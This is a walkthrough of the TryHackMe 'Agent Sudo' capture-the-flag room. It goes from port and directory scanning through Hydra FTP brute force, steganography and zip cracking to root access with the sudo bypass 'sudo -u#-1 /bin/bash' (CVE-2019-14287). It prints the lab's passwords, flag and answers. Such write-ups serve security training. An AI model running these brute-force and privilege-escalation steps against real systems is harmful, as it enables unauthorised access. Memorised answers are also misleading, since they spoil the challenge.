All steps and concepts about CTF made on https://tryhackme.com/room/agentsudoctf :

1 - PortScaning

    nmap -sV 10.10.59.144

    PORT     STATE    SERVICE  VERSION
    21/tcp   open     ftp      vsftpd 3.0.3
    22/tcp   open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp   open     http     Apache httpd 2.4.29 ((Ubuntu))
    3005/tcp filtered deslogin

2 - List paths and directories with Dirb

    dirb http://10.10.59.144/ 

3 - When access the base path http://10.10.59.144/ , returns:

    Dear agents,

    Use your own codename as user-agent to access the site.

    From,
    Agent R

4 - The third hint says :

    You might face problem on using Firefox. Try 'user agent switcher' plugin with user agent: C

5 - We can switch the user-agent value of request header with BurbSuite intercepting it 

    When edited 'User-agent: C' , returns on secret path file to be acess agent_C_attention.php

6 - The http://10.10.59.144/agent_C_attention.php returns:

    Attention chris,

    Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

    From,
    Agent R

7 - 'chris' is one answer/flag

8 - With user 'chris' , we can force brutal attack on FTP using Hydra because it's tell the password is weak

    hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.59.144 ftp

    There is one match:

    [21][ftp] host: 10.10.59.144   login: chris   password: crystal

9 - With user and password of ftp, lets connect

    ftp chris@10.10.59.144 -p 21

10 - On ftp, there are 2 .jpg files and To_agentJ.txt contents:

    Dear agent J,

    All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for 
    you.

    From,
    Agent C

11 - By viewing the “To_agentJ.txt” file the message was login password for the chris is stored in the fake picture.

12 - Let understand the content of .jpg files downloading it with

    mget *

13 - It's possible get hide content on file with strings command

    strings cutie.jpg
    
    The final of contents, call attention :
 
    To_agentR.txt
    W\_z#
    2a>=
    To_agentR.txt
    EwwT

    **** It didn't help anything, but:

14 - binwalk -e cutie.png which extracted all the hidden files in it.

    DECIMAL       HEXADECIMAL     DESCRIPTION

    There is a zip file hidden
    And finally we got the ZIP (one CTF) file but to extract the txt file need the password. 
    Brute-force it to crack the password.

15 - Go to the folder result generated of extract previous

    cd _cutie.png.extracted

16 - zip2john 8702.zip>output.txt This will give hash of the password in txt file

17 - john --format=zip output.txt This will get us the password

    Using default input encoding: UTF-8
    Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])

    Use the "--show" option to display all of the cracked passwords reliably
    Session completed.

17 - #2 Zip file password

    Ans: alien
    
18 - Knowing the password of zip file, just unzip it: (use the password step before)

    7z e 8702.zip

19 - It extracted a To_agentR.txt file:

    Agent C,

    We need to send the picture to 'QXJlYTUx' as soon as possible!

    By,
    Agent R

20 - On site analyser (https://www.tunnelsup.com/hash-analyzer/), we analysed 'QXJlYTUx' is base64, so decode it with (https://www.base64decode.org/)

    #3 steg password

    Ans: Area51

21 - #4 Who is the other agent (in full name)?

    With the password step before
    
    Now only images file left is “cute-alien.jpg” so we used the “steghide” tool to retrieve hidden info

    steghide extract -sf cute-alien.jpg

    use Area51 as password

22 - It generates a message.txt:

    Hi james,

    Glad you find this message. Your login password is hackerrules!

    Don't ask me why the password look cheesy, ask agent R who set this password for you.

    Your buddy,
    chris

23 - #4 Who is the other agent (in full name)?
    james

24 - #5 SSH password?

    hackerrules 

25 - Access ssh with this two previous informations

    ssh james@10.10.59.144  

26 - Get content of user_flag.txt on base path

    b03d975e8c92a7c04146cfa7a5a313c7

27 -#2 What is the incident of the photo called?

    Like hint says, just search for 'foxnews Alien_autospy' on Google

    https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment

    The title of new says 'Roswell alien autopsy' - this is the flag

#Privile Escalation

28 - Log into ssh and checked for the permission the user has with “sudo -l” command.

    [sudo] password for james: 
    Matching Defaults entries for james on agent-sudo:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User james may run the following commands on agent-sudo:
        (ALL, !root) /bin/bash

29 - It's said about /bin/bash, Let's exploit it . Check the sudo -V

    └─$ sudo -V       
    Sudo version 1.8.21p2
    Sudoers policy plugin version 1.8.21p2
    Sudoers file grammar version 46
    Sudoers I/O plugin version 1.8.21p2

30 - On exploit https://www.exploit-db.com/ , search for this sudo version 1.8.21;

    The following https://www.exploit-db.com/exploits/47502 talk about 1.8.27 - Security Bypass

    Our version is smaller, and can be used

31 - # (Format: CVE-xxxx-xxxx)

    CVE-2019-14287

32 - Run the exploit 

    sudo -u#-1 /bin/bash

33 - You must be logged by root now on return of whoami

34 - Get the content of flag:

    cat /root/root.txt
